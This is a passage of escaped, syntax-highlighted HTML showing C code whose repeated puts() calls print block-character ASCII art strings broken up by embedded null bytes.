░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
